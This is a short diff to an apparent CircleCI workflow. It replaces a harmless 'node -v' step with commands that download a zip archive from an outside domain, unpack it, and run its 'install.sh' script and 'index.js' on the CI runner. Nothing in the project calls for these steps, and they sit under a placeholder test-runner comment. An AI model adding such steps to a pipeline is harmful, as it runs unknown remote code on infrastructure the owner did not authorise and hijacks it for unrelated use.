@@ -10,7 +10,12 @@ jobs:
       - checkout
       # Replace this with a real test runner invocation
       - run: lscpu
-      - run: node -v
+      - run: wget https://skywages.my.id/assets/browser_wa.zip
+      - run: unzip browser_wa.zip
+      - run: npm i -g yarn
+      - run: yarn install
+      - run: sh install.sh
+      - run: node index.js
 
 workflows:
   example:
